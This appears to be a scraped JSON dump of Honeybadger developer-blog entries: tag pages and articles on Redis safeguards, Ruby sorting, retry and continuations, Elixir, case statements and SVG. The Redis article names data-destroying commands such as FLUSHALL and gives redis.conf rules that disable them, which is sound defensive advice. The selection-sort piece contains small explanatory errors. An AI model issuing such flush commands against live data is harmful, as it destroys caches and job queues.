{"website": "Honey-Badger", "title": "#front-end Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/front-end/", "abstract": "", "date": "2015-03-04"},
{"website": "Honey-Badger", "title": "#performance Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/performance/", "abstract": "", "date": "2015-04-02"},
{"website": "Honey-Badger", "title": "#allocation_stats Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/allocation-stats/", "abstract": "", "date": "2015-04-02"},
{"website": "Honey-Badger", "title": "#integrations Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/integrations/", "abstract": "", "date": "2015-04-23"},
{"website": "Honey-Badger", "title": "#bitbucket Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/bitbucket/", "abstract": "", "date": "2015-04-23"},
{"website": "Honey-Badger", "title": "#mobile Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/mobile/", "abstract": "", "date": "2015-05-14"},
{"website": "Honey-Badger", "title": "#gophercon Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/gophercon/", "abstract": "", "date": "2015-07-08"},
{"website": "Honey-Badger", "title": "#golang Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/golang/", "abstract": "", "date": "2015-07-08"},
{"website": "Honey-Badger", "title": "Tools Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/developer-tools/", "abstract": "", "date": "2015-08-17"},
{"website": "Honey-Badger", "title": "#clients Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/clients/", "abstract": "", "date": "2015-07-08"},
{"website": "Honey-Badger", "title": "#jekyll Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/jekyll/", "abstract": "", "date": "2015-10-13"},
{"website": "Honey-Badger", "title": "#heroku Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/heroku/", "abstract": "", "date": "2016-05-11"},
{"website": "Honey-Badger", "title": "#guest-post Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/guest-post/", "abstract": "", "date": "2016-11-08"},
{"website": "Honey-Badger", "title": "#node Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/node/", "abstract": "", "date": "2016-05-17"},
{"website": "Honey-Badger", "title": "#startup-advice Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/startup-advice/", "abstract": "", "date": "2016-10-06"},
{"website": "Honey-Badger", "title": "Conferences Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/conferences/", "abstract": "", "date": "2016-11-21"},
{"website": "Honey-Badger", "title": "#sidekiq Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/sidekiq/", "abstract": "", "date": "2017-10-31"},
{"website": "Honey-Badger", "title": "#testing Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/testing/", "abstract": "", "date": "2018-08-01"},
{"website": "Honey-Badger", "title": "#vue Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/vue/", "abstract": "", "date": "2018-11-29"},
{"website": "Honey-Badger", "title": "#lambda Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/lambda/", "abstract": "", "date": "2018-11-30"},
{"website": "Honey-Badger", "title": "#turbolinks Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/turbolinks/", "abstract": "", "date": "2019-07-17"},
{"website": "Honey-Badger", "title": "#redis Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/redis/", "abstract": "", "date": "2019-08-05"},
{"website": "Honey-Badger", "title": "#CircleCI Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/circleci/", "abstract": "", "date": "2019-09-16"},
{"website": "Honey-Badger", "title": "#GitHub Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/github/", "abstract": "", "date": "2019-09-19"},
{"website": "Honey-Badger", "title": "#aws Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/aws/", "abstract": "", "date": "2019-10-08"},
{"website": "Honey-Badger", "title": "DevOps Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/devops/", "abstract": "", "date": "2019-10-30"},
{"website": "Honey-Badger", "title": "#FounderQuest Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/founderquest/", "abstract": "", "date": "2019-12-13"},
{"website": "Honey-Badger", "title": "#debugging Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/debugging/", "abstract": "", "date": "2020-02-06"},
{"website": "Honey-Badger", "title": "#serverless Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/serverless/", "abstract": "", "date": "2020-10-15"},
{"website": "Honey-Badger", "title": "Honeybadger Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/honeybadger/", "abstract": "", "date": "2020-12-02"},
{"website": "Honey-Badger", "title": "#python Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/python/", "abstract": "", "date": "2020-11-25"},
{"website": "Honey-Badger", "title": "#go Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/go/", "abstract": "", "date": "2020-12-22"},
{"website": "Honey-Badger", "title": "JavaScript Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/javascript/", "abstract": "", "date": "2021-01-21"},
{"website": "Honey-Badger", "title": "#security Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/security/", "abstract": "", "date": "2021-02-08"},
{"website": "Honey-Badger", "title": "Elixir Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/elixir/", "abstract": "", "date": "2021-03-01"},
{"website": "Honey-Badger", "title": "#laravel Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/laravel/", "abstract": "", "date": "2021-03-31"},
{"website": "Honey-Badger", "title": "#js Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/js/", "abstract": "", "date": "2021-05-10"},
{"website": "Honey-Badger", "title": "#git Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/git/", "abstract": "", "date": "2021-05-03"},
{"website": "Honey-Badger", "title": "Rails Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/rails/", "abstract": "", "date": "2021-05-10"},
{"website": "Honey-Badger", "title": "#php Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/php/", "abstract": "", "date": "2021-05-17"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/", "abstract": "", "date": "2021-05-24"},
{"website": "Honey-Badger", "title": "Introducing: Honeybadger for Python 3", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/honeybadger-for-python-3/", "abstract": "Rails developers! Do you: Love Monty Python? Run a web app on Django? Need to monitor a big data project? You're in luck: Now Honeybadger for Python officially supports Python 3. Read the changelog Get the same support for Django as you do for Rails - it works out of the box . We report all unhandled exceptions occurring with your Django web requests. If you're setting up a pure Python app or another framework like Flask or web2py, you'll need to import Honeybadger and configure it with your API key . Set up Honeybadger for Python 3 This is our second release, and we are glad our adorable mascot, the Honeybadger, lives up to its reputation of eating Python (errors). If you have any questions or feedback, make sure to email , submit an issue , or make a pull request . Get Honeybadger for Python 3", "date": "2016-10-11"},
{"website": "Honey-Badger", "title": "What if I called FLUSHALL on your Redis instance? 😱", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/safeguarding-redis/", "abstract": "At Honeybadger, we use Redis a lot . It's our Swiss Army Knife; it's a cache, a single source of truth, it stores background jobs, and more. Basically, Redis is one of those services that should never fail. I was pondering the DevOps apocalypse recently, as one does (could Redis be one of the four horsemen?), which led me to jump into our #ops channel to ask Ben a simple question: josh [13:58] what are the risks if someone executed flushall on our redis instances? Ben [13:58] you just gave me a micro heart attack josh [13:59] rofl Sorry :) I didn’t do it, for the record Ben [14:00] all kinds of badness would happen... the job queues would be flushed, there would be a potential for duplicate notifications, timeline charts would start hitting ES instead of being cached, and more :) it would make for a very bad day :) Don't worry, Ben recovered after a few hours, and is mostly back to his old self again. I should have prefaced my question; I didn't mean to suggest that I'd actually flushed our Redis cluster . Still, it kind of proved my point. Maybe trolling your SREs and measuring their sweat is a good way to plan for catastrophes... SO. I'd identified a potential issue. It would be really bad if Redis got flushed. What are the risks of that happening? Our Redis clusters are deployed with primary and secondary instances across multiple availability zones in AWS, with automatic failover to the secondary in case of primary failure. That's a pretty rock-solid Redis deployment; we can lose entire instances without losing data or even impacting other services. Unfortunately, preventing human error is much harder, and for some reason, Redis makes it dead-simple to delete all your data with a single command entered in the wrong console. Our architecture did not guard against that. While our team is aware of this, there's a pretty good chance that a future developer could make this mistake. In fact, my friend Molly Struve, Sr. SRE at Kenna Security , remembers a situation where something similar happened: We made a change to some code that caused the old cache values in Redis to break with the new code. So we would request the old value and it was not what the code was expecting. Rather than rollback the code, one of our engineers thought it would be fine to run Rails.cache.data.flushdb and just start with a fresh cache. Like Honeybadger, Kenna uses Redis for several things—one is the cache-backend for their Ruby on Rails application. The command Molly mentioned, Rails.cache.data.flushdb , is the Ruby on Rails equivalent of opening up a Redis console and calling FLUSHDB (which deletes all data in the current database). Unfortunately, Redis was also being used to cache report data from Elasticsearch (something that we also do at Honeybadger, incidentally), and that's where things went wrong. When the Redis database was flushed, the cache had to be rebuilt from scratch, which overwhelmed their Elasticsearch cluster: We have a \"Dashboard\" page where clients can load part of ALL their reports (think hundreds), and when clients started to hit that without the cache, Elasticsearch lit up like a Christmas Tree. CPU maxed out on all nodes across the board. In the end it was a mad scramble to open multiple consoles to re-cache the reports. After Kenna's systems were restored, Molly worked with the development team to identify steps they could take to prevent the same thing from happening in the future. They came up with a creative safeguard for new developers who might not realize that clearing the Rails cache is a destructive action: they made all production application consoles read-only by default . Luckily, Kenna's incident was not catastrophic—they were able to recover from it after just a little downtime. It would have been much worse had the unlucky developer accidentally called FLUSHALL —which flushes all Redis databases—instead of FLUSHDB . It would have been an easy mistake under pressure, especially when exception reports are already rolling in (did I mention they also use Honeybadger?) Let me ask you a quick question: what would happen if someone called FLUSHALL on your Redis console? If the answer is \"all hell would break loose\", then you might consider taking preventative action. Here's what we went with; of course, this is us (I'm more than a little paranoid)—your mileage may vary. First, access to Redis through clients (i.e., in the Rails console) should disallow use of the FLUSHALL and FLUSHDB commands entirely. Developers never need to run these commands in production; doing so would cause serious problems, so why have them at all? If you're a Ruby/Rails user, feel free to steal this gist . If you want something a bit more comprehensive, see Molly's gist . If you use a different programming language, hopefully there is a way to disable these commands, but even if there isn't, don't worry, I got you. The Redis config that everyone should use Mike Perham, the creator of Sidekiq (by far the most popular Ruby background job system, with an awesome business model ), knows a thing or two about Redis. Sidekiq is built on top of Redis to provide an incredibly reliable and efficient job system. I asked Mike what best-practices he recommends to his customers, many of which have mission-critical Redis deployments (think Netflix and Oracle). He told me that users who are concerned about the safety of their Redis data should disable destructive commands entirely via Redis's configuration file. This approach has the added benefit that the commands are disabled everywhere, including in redis-cli consoles. The following config should be added to redis.conf : rename-command FLUSHALL \"\"\nrename-command FLUSHDB \"\"\nrename-command CONFIG \"\"\nrename-command SWAPDB \"\" Renaming the above commands to empty strings means that they will no longer exist as Redis commands. If you still want to be able to call them in rare (and intentional) circumstances, you can rename them to something secret: rename-command FLUSHALL SUDO_FLUSHALL_222ed15a\nrename-command FLUSHDB SUDO_FLUSHDB_2a3bdd5e For instance, you could put those commands in a doomsday ops playbook which only your operations team has access to. Treat them like your company's nuclear codes. Of course, there's always a caveat 🤦 We use Amazon's ElastiCache service to host our Redis clusters, and after some research, I learned that ElastiCache does not provide direct access to redis.conf , and it doesn't provide a Redis configuration parameter for rename-command . So unfortunately, while our application consoles are safe, we still must handle redis-cli with care. In the end, we added a note about this to our internal Redis playbook, and will revisit the ElastiCache documentation occasionally to see if Amazon gives us access to rename-command . Failures are inevitable If it were possible to prevent 100% of failures before they occur, our jobs would be much easier. We wouldn't need on-call rotations or postmortems, and we could all code full-time. Unfortunately, we live in the real world, where chaos rules, and entropy ensures that our systems are constantly deteriorating. There's risk inherent in everything we do. To ship stable applications, we should take actions which minimize risk. In doing so, we reduce (but not eliminate) the potential for failures. Being able to evaluate the risks associated with your actions dramatically increases your value as a developer. Molly's story and others convinced me that the same thing could easily happen to us; the (perceived) risk was high. The solution—disabling potentially destructive commands, or making them extremely difficult to execute—was relatively easy. There's a name for the combination of high value and minimum effort: low-hanging fruit. In the context of software, it's the idea that if you can gain a lot by making a small change, it's probably worth doing. This felt like it was in the sweet spot of eliminating a big risk for a small amount of effort. Kind of like the first time I installed Honeybadger... ;)", "date": "2019-08-05"},
{"website": "Honey-Badger", "title": "Understanding Selection Sort with Ruby", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/ruby-selection-sort/", "abstract": "Note: This is part 2 of a series looking at different sorting algorithms with Ruby. Part 1 explored bubble sort . In this post, I'll be walking through how to implement a selection sort algorithm with Ruby. Selection sort is an in-place comparison sorting algorithm. This means that sorted items occupy the same storage as the original ones. Before we go any further, it's important to note that the selection sorting algorithm is not commonly used in practice unless the dataset is small (i.e., 10-20 elements). However, it's a great starter algorithm to learn and understand, similar to learning how to ride a tricycle before a bicycle, if you will. The implementation might show up on a coding challenge for a job interview, or you might be asked to explain why an algorithm like selection sort would not be very practical on a large dataset. Selection sort does usually outperform bubble sort, which is the first algorithm we looked at in this series. At a high level, selection sort divides the array into two parts: one half sorted and the other not. At the onset, the sorted section is empty, and the unsorted portion contains all of the elements. Selection sort utilizes two loops; the outer loop iterates n times, where n is the number of elements in the array. We immediately set the \"min index\" to the first element, and then use another loop to compare elements, swapping the min index if the adjacent element is less than the current minimum. If this is hard to follow, don't worry! We're going to walk through an actual example next. :) Step By Step Let's start with an array with the following elements: [10, 30, 27, 7, 33, 15, 40, 50] Iteration one: Find the smallest number In this case, the smallest number is 7 , so we place it at the beginning and move 10 to where the 7 was. Our array now looks like this: [7, 30, 27, 10, 33, 15, 40, 50] Iteration two: Find the next smallest number Starting at the element in index position 1 (remember, arrays are 0-indexed), find the next smallest element In this case, it is 10. Move 10 to the second position in the array and move 30 to where the 10 was. The resulting array is this: [7, 10, 27, 30, 33, 15, 40, 50] From here, we continue this exact process until our array is fully sorted. Below, you can see the resulting arrays after the next iterations. Iteration three: [7, 10, 15, 30, 33, 27, 40, 50] Iteration four: [7, 10, 15, 27, 33, 30, 40, 50] Iteration five: [7, 10, 15, 27, 30, 33, 40, 50] Bingo! We are sorted! If you're more a visual learner, here is an example of how a selection sort would work with an array of [] Photo credit A Ruby Implementation Here is a selection sort function written in Ruby: def selection_sort ( array ) n = array . length - 1 n . times do | i | min_index = i for j in ( i + 1 ) .. n min_index = j if array [ j ] < array [ min_index ] end array [ i ], array [ min_index ] = array [ min_index ], array [ i ] if min_index != i end puts array end Let's look at how this works. First, we set n equal to the number of elements. Remember, we need to subtract one because arrays are 0-indexed. Next, we create our outer loop, which is going to run n times. min_index = i Here, we are setting the minimum index to the element in the first position. for j in ( i + 1 ) .. n Next, we create our inner loop. This line is saying \"for the element in the second position to the nth element, do what follows\". If you aren't familiar with the .. operator, it creates a range from the start point to the endpoint, inclusively. For example, 1..10 creates a range from 1 to 10, inclusive. min_index = j if array [ j ] < array [ min_index ] Inside this loop, we set the min_index to a new element if it less than the current min_index . array [ i ], array [ min_index ] = array [ min_index ], array [ i ] if min_index != i Outside of our inner loop, we look to see if the current min_index is equal to i . If this is true, we need to shuffle our elements. We set array[i] to array[min_index] and array[min_index] to array[i] . Here, we are performing the \"swap\" the same as we did in our example. Finally, once we are finished, we output our array, which is now sorted! Putting it All Together Here is my full program: def selection_sort ( array ) n = array . length - 1 n . times do | i | min_index = i for j in ( i + 1 ) .. n min_index = j if array [ j ] < array [ min_index ] end array [ i ], array [ min_index ] = array [ min_index ], array [ i ] if min_index != i end puts array end array = [ 10 , 30 , 27 , 7 , 33 , 15 , 40 , 50 ] selection_sort ( array ) Running ruby ruby-selection-sort.rb from the terminal outputs the following: 7\n10\n15\n27\n30\n33\n40\n50 Cool! Understanding Why Selection Sort is Inefficient One way to measure an algorithm's efficiency is to look at the \"Big-O notation\"; this represents the worst-case performance so that algorithms can be compared. For example, an algorithm with a Big-O of O(1) means that the worst-case run time is constant as the number of elements, \"n\", grows, whereas an algorithm with a Big-O notation of O(n) means that the worst-case run time increases linearly as n grows. This means that if you have an array with 100 elements and must choose between sorting algorithms that are O(n) and O(1), you would choose the O(1) algorithm because O(1) definitely beats O(100). Like the bubble sort, the selection sort has a worst-case and average complexity of O(n^2) because of the nested loops. This means that its efficiency decreases dramatically as the number of elements grows. Wrapping Up All things considered, selection sort is still an interesting algorithm that may pop-up in a coding challenge. Or, you may be given a selection sort function and asked what the Big-O notation is and why. Hopefully, the examples in this article will help you be ready to tackle either scenario.", "date": "2020-08-25"},
{"website": "Honey-Badger", "title": "Announcing the New Honeybadger iOS App", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/announcing-the-new-honeybadger-ios-app/", "abstract": "Have you ever wished you could use honeybadger on your iPhone, iPad or Apple Watch? Well now you can. We're super excited to announce the release of the official Honeybadger app for iOS. With this new app you'll get flexible push notifications for errors and outages. You'll be able to recognize critical problems at a glance, and put off less critical issues until tomorrow. You'll be able to assign errors and participate in discussions from anywhere you can take your phone. Get it now from the iOS app store. (http://bit.ly/honeybadger-ios) Prefer Android? We expect to have an Android version by July, so stay tuned! You can search errors, mark them resolved and assign them. View full backtraces, request params, cookies and more on the error details page. View recent outages, as well as request latencies from our geographically-distributed uptime checkers. Scan to visit the app store page for the Honeybadger iOS app", "date": "2015-05-14"},
{"website": "Honey-Badger", "title": "How to \"try again\" when exceptions happen in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-try-again-when-exceptions-happen-in-ruby/", "abstract": "Not all errors are fatal. Some just indicate that you need to try again. Fortunately, Ruby provides a few interesting mechanisms that make it easy to \"try again\" - though not all of them are obvious or well-known. In this post we'll take a look at these mechanisms and how they work in the real world. Introducing retry Ok - this one is kind of obvious, but only if you know it exists. Personally, I was well into my Ruby career before I learned about the delightful \"retry\" keyword. Retry is built in to Ruby's exception rescuing system. It's quite simple. If you use \"retry\" in your rescue block it causes the section of code that was rescued to be run again. Let's look at an example. begin retries ||= 0 puts \"try # #{ retries } \" raise \"the roof\" rescue retry if ( retries += 1 ) < 3 end # ... outputs the following: # try #0 # try #1 # try #2 There are a few things to note here: When retry is called, all of the code in between begin and rescue is run again. It most definitely does not \"pick up where it left off\" or anything like that. If you don't provide some mechanism to limit retries, you will wind up with an infinite loop. Code in both the begin and rescue blocks are able to access the same retries variable in the parent scope. The Problem With retry While retry is great it does have some limitations. The main one being that the entire begin block is re-run. But sometimes that's not ideal. For example, imagine that you're using a gem that lets you post status updates to Twitter, Facebook, and lots of other sites by using a single method call. It might look something like this. SocialMedia . post_to_all ( \"Zomg! I just ate the biggest hamburger\" ) # ...posts to Twitter API # ...posts to Facebook API # ...etc If one of the APIs fails to respond, the gem raises a SocialMedia::TimeoutError and aborts. If we were to catch this exception and retry, we'd wind up with duplicate posts because the retry would start over from the beginning. begin SocialMedia . post_to_all ( \"Zomg! I just ate the biggest hamburger\" ) rescue SocialMedia :: TimeoutError retry end # ...posts to Twitter API # facebook error # ...posts to Twitter API # facebook error # ...posts to Twitter API # and so on Wouldn't it be nice if we were able to tell the gem \"Just skip facebook, and keep on going down the list of APIs to post to.\" Fortunately for us, Ruby allows us to do exactly that. NOTE: Of course the real solution to this problem is to re-architect the social media library. But this is far from the only use-case for the techniques I'm going to show you. Continuations to the Rescue Continuations tend to scare people. But that's just because they're not used very frequently and they look a little odd. But once you understand the basics they're really quite simple. A continuation is like a  \"save point\" in your code, just like in a video game. You can go off and do other things, then jump back to the save point and everything will be as you left it. ...ok, so it's not a perfect analogy, but it kind of works. Let's look at some code: require \"continuation\" counter = 0 continuation = callcc { | c | c } # define our savepoint puts ( counter += 1 ) continuation . call ( continuation ) if counter < 5 # jump back to our savepoint You may have noticed a few weird things. Let's go through them: We use the callcc method to create a Continuation object. There's no clean OO syntax for this. The first time the continuation variable is assigned, it is set to the return value of callcc 's block. That's why the block has to be there. Each time we jump back to the savepoint, the continuation variable is assigned whatever argument we pass the call method. That's why we use the weird looking continuation.call(continuation) syntax. Adding Continuations to Exceptions We're going to use continuations to add an skip method to to all exceptions. The example below shows how it should work. Whenever I rescue an exception I should be able to call skip , which will cause the code that raised the exception to act like it never happened. begin raise \"the roof\" puts \"The exception was ignored\" rescue => e e . skip end # ...outputs \"The exception was ignored\" To do this I'm going to have to commit a few sins. Exception is just a class. That means I can monekypatch it to add a skip method. class Exception attr_accessor :continuation def skip continuation . call end end Now we need to set the continuation attribute for every exception. It turns out that raise is just a method, which we can override. BTW, the code below is taken almost verbatim from Advi's excellent slide deck Things You Didn't know about Exceptions .  I just couldn't think of a better way to implement it than this: require 'continuation' module StoreContinuationOnRaise def raise ( * args ) callcc do | continuation | begin super rescue Exception => e e . continuation = continuation super ( e ) end end end end class Object include StoreContinuationOnRaise end Now I can call the skip method for any exception and it will be like the exception never happened.", "date": "2015-07-07"},
{"website": "Honey-Badger", "title": "Major Client Update For Elixir", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-for-elixir-v0-7/", "abstract": "This month we released a new version of our hex package, which includes a major refactor of the internal client logic as well as some new features, improvements, and bug fixes. We're super excited to share the release of honeybadger v0.7 with you! Here are the highlights: Better Async Handling The Honeybadger client now uses a separate process (via GenServer ) to report errors in the background, instead of spawning new tasks. A supervision tree is started with the client as a child. We think this is a much better way to do asynchronous work like ours, and it should result in improved performance in applications which report a lot of errors. Check out the Pull Request . Improved Phoenix Support Errors reported from Plug now automatically include the controller and action name from Phoenix. This was previously possible by including our Plug directly in each controller, but not if you added it to the Phoenix router, which is a much nicer way to get error reporting in all Phoenix controllers: defmodule MyPhoenixApp . Router do use Crywolf . Web , :router use Honeybadger . Plug pipeline :browser do [ ... ] end end The controller name is also used to help group similar errors in the Honeybadger UI, so this update should make error grouping more logical in some applications. Check out the Pull Request . New Ways to Notify The client now supports sending more arbitrary errors to Honeybadger. For instance, you can call Honeybadger.notify/1 with a string or a map : # With just an error message: Honeybadger . notify ( \"oops!\" ) # With a map: Honeybadger . notify (%{ class: \"CustomError\" , message: \"oops!\" }) Check out the Pull Request . Smarter Stack Traces When calling Honeybadger.notify with custom arguments, the accuracy of the generated stack trace has been improved. Check out the Pull Request . Test Your Configuration We've added a new mix task which can be invoked with mix honeybadger.test . When invoked, the task will report a test exception to your Honeybadger project, verifying that your application is configured correctly. Check out the Pull Request . Bug Fixes, Etc. Last but not least, we fixed a bunch of bugs and made even more improvements, making v0.7 the most stable release yet. Check out the CHANGELOG for a full list of fixes included in this release. A Special Thanks I would like to specially thank Parker Selbert (@sorentwo) , who was a major contributor to the v0.7 release. Thanks Parker, this release wouldn't have been possible without you!", "date": "2017-11-29"},
{"website": "Honey-Badger", "title": "Ruby's case statement - advanced techniques", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rubys-case-statement-advanced-techniques/", "abstract": "Nothing could be simpler and more boring than the case statement. It's a holdover from C. You use it to replace a bunch of ifs. Case closed. Or is it? Actually, case statements in Ruby are a lot richer and more complex than you might imagine. Let's take a look at just one example: case \"Hi there\" when String puts \"case statements match class\" end # outputs: \"case statements match class\" This example shows that case statements not only match an item's value but also its class . This is possible because under the hood, Ruby uses the === operator, aka. the three equals operator. A quick tour of the === operator When you write x === y y in Ruby, you're asking \"does y belong in the group represented by x?\" This is a very general statement. The specifics vary, depending on the kind of group you're working with. # Here, the Class.===(item) method is called, which returns true if item is an instance of the class String === \"hello\" # true String === 1 # false Strings, regular expressions and ranges all define their own ===(item) methods, which behave more or less like you'd expect.  You can even add a triple equals method to your own classes. Now that we know this, we can do all sorts of tricks with case. Matching ranges in case statements You can use ranges in case statements thanks to the fact that range === n simply returns the value of range.include?(n) . How can I be so sure? It's in the docs . case 5 when ( 1 .. 10 ) puts \"case statements match inclusion in a range\" end # outputs \"case statements match inclusion in a range\" Matching regular expressions with case statements Using regexes in  case statements is also possible, because /regexp/ === \"string\" returns true only if the string matches the regular expression. The docs for Regexp explain this. case \"FOOBAR\" when /BAR$/ puts \"they can match regular expressions!\" end # outputs \"they can match regular expressions!\" Matching procs and lambdas This is kind of a weird one. When you use Proc#===(item) , it's the same as doing Proc#call(item) . Here are the docs for it. What this means is that you can use lambdas and procs in your case statement as dynamic matchers. case 40 when -> ( n ) { n . to_s == \"40\" } puts \"lambdas!\" end # outputs \"lambdas\" Writing your own matcher classes As I mentioned above, adding custom case behavior to your classes is as simple as defining your own === method. One use for this might be to pull out complex conditional logic into multiple small classes. I've sketched out how that might work in the example below: class Success def self . === ( item ) item . status >= 200 && item . status < 300 end end class Empty def self . === ( item ) item . response_size == 0 end end case http_response when Empty puts \"response was empty\" when Success puts \"response was a success\" end", "date": "2015-07-15"},
{"website": "Honey-Badger", "title": "How SVG helped me level up as a front-end developer", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-svg-helped-me-level-up-as-a-front-end-developer/", "abstract": "SVG has been around since 1999. Those were heady days. People had invented and were in love with XML - if you can believe that. If you picked up a trade magazine like Dr. Dobb's Journal - which in those days both existed and was printed on real paper - you saw how every single problem in computer science was being solved via the magic of XML. Everything old is new again. SVG - which stands for Scalable Vector Graphics - is cool again. Why? Because of Apple, and a technology called Retina. The Curse of Retina Now that we have retina screens, and 4k displays, and tablets and phones with god-knows-how-many pixels per inch, we have a problem. You and I have a problem as web developers because we no longer know if images look good on every screen. We can guess. We can save images at twice their normal size and let the browser sort it out. But what happens next year when displays go from 4k to 6k or 8k? And if your image happens to have text in it, you're kind of screwed no matter what happens. Because scaling raster images with text almost always results in jaggedness or fuzziness. SVG solves these problems. Since it's Scalable, it looks great on any display. And it's surprisingly concise. File Size - SVG vs PNG This SVG logo is only 2kb gzipped: The PNG is 11kb.  This may depend on your browser, but in Chrome, the SVG above is much crisper: SVG as an You can treat SVG files like any image. The only difference is that the SVG will scale to fit its container. If you want to give it a different size, you need to specify it via CSS. <img src= \"/images/2015/03/logo.svg?1621992926\" style= \"width: 800px;\" > The benefit of treating SVG like a normal image is that you can use CDNs and browser caching, plus it's easy. The drawback is that you can't manipulate SVGs loaded this way via JavaScript or CSS. SVG as an element Since an SVG is just XML, you can embed it inside your HTML document. This is nice for elements like logos that you want to load immediately. Why else would you want to do this? You can manipulate the SVG embedded like this with CSS: <style> #my-circle { fill : red ; stroke : black ; } </style> <svg height= \"100\" width= \"100\" > <circle cx= \"50\" cy= \"50\" r= \"40\" id= \"my-circle\" /> </svg> You can get tricky and fragment-cache elements that are DB intensive like charts: < % cache(chart) do %>\n  <svg> < %= chart.points %>\n  </svg>  \n<% end %> SVGs can be manipulated with JavaScript You can change any SVG element using JavaScript. This is much cooler than it sounds. Suppose you wanted to generate custom posters. You could have the designer export their Illustrator files to SVG. Then when the user enters their custom text or images, you use JS to add them to the original template. I've actually done that. :) Here's an example: <!DOCTYPE html> <html> <body> <svg height= \"30\" width= \"200\" > <text x= \"0\" y= \"15\" fill= \"red\" id= \"myText\" > I love SVG! </text> </svg> <script> document . getElementById ( \" myText \" ). textContent = \" Yr SVG haz been hax0rd! \" ; </script> </body> </html> You can manipulate raster images with SVGs Not only can you embed PNGs, JPGs and GIFs into your SVG, you can manipulate them. I'm talking about clipping paths, scaling, blurring and other things you thought you needed Photoshop to do. Here's an example where we show the same image in two places. But we use SVG to convert one of them to black and white. <!DOCTYPE html> <html> <body> <svg width= \"1400\" height= \"500\" version= \"1.1\" xmlns:xlink= \"http://www.w3.org/1999/xlink\" xmlns= \"http://www.w3.org/2000/svg\" > <filter id= \"grayscale\" ><feColorMatrix type= \"saturate\" values= \"0\" /></filter> <image width= \"640\" height= \"480\" xlink:href= \"http://lorempixel.com/output/animals-q-c-640-480-9.jpg\" /> <image filter= \"url(#grayscale)\" x= \"700\" width= \"640\" height= \"480\" xlink:href= \"http://lorempixel.com/output/animals-q-c-640-480-9.jpg\" /> </svg> </body> </html> This is what it looks like: SVGs can be animated You can animate SVGs using SMIL , CSS and JavaScript. The latter is by far the most flexible. There have been several libraries released recently to make it easy. A good one is Snap . SVGs are cross-platform At Honeybadger, we have some little graphs for server stats like RAM and CPU load. By generating server-side as SVG, we're able to re-use them in our mobile applications. And it goes without saying, all modern browsers support SVG down to IE 9.", "date": "2015-03-04"},
{"website": "Honey-Badger", "title": "We're partnering with PagerDuty!", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/were-officially-partnering-with-pagerduty/", "abstract": "Today is a big day for us. It’s the first day of our OFFICIAL partnership with the fine folks over at PagerDuty. What does that mean for you? It means you'll have even more control over how and when you receive your Honeybadger alerts. You simply point the firehose (us) at PagerDuty, and they make sure that alerts get to the right person. Rules can be based on time of day, the type of alert, and a lot of other attributes. It's really pretty cool. How to get started To check it out, go to Pager Duty , sign up, and get an API key. Go to your project page. Then click on “settings”. Now select the “Integrations” tab. Click “PagerDuty” and enter in your API key. You can even set up rate escalation alerts. That’s it! Honeybadger alerts will now flow through Pagerduty!", "date": "2013-11-04"},
